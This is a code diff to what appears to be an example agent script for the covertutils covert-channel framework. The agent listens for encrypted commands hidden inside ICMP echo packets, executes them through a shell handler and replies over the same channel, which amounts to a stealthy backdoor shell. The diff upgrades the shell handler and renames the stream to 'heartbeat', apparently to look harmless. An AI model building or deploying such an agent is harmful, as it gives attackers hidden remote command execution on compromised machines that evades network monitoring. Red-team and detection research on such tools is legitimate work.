@@ -3,7 +3,7 @@
 
 from covertutils.orchestration import SimpleOrchestrator
 from covertutils.handlers import ResponseOnlyHandler, FunctionDictHandler
-from covertutils.handlers.impl import SimpleShellHandler
+from covertutils.handlers.impl import StandardShellHandler
 
 from scapy.all import sniff, IP, ICMP, Raw		# Never bloat scapy import with *
 from scapy.all import send as scapy_send	# unexpected things will happen
@@ -71,7 +71,7 @@ sniff_thread.start()			# Run the ICMP echo collector in a thread
 
 #	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
 #	FunctionDictHandler to set the dict of functions run on messages
-class AgentHandler( ResponseOnlyHandler, SimpleShellHandler ) :
+class AgentHandler( ResponseOnlyHandler, StandardShellHandler ) :
 
 	def onNotRecognised( self ) :	# When Junk arrives
 		global packet_info	# It means that the packet is not created by Handler
@@ -108,7 +108,7 @@ orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from 
 				tag_length = 2,		# The tag length in bytes
 				out_length = 52,	# The absolute output byte length (with tags)
 				in_length = 52,		# The absolute input byte length (with tags)
-				streams = ['main'],	# Stream 'control' will be automatically added as failsafe mechanism
+				streams = ['heartbeat'],	# Stream 'control' will be automatically added as failsafe mechanism
 				reverse = False )	# Reverse the encryption channels - Handler has `reverse = True`
 
 agent = AgentHandler( recv, send, orchestrator,			# Instantiate the Handler object. Finally!
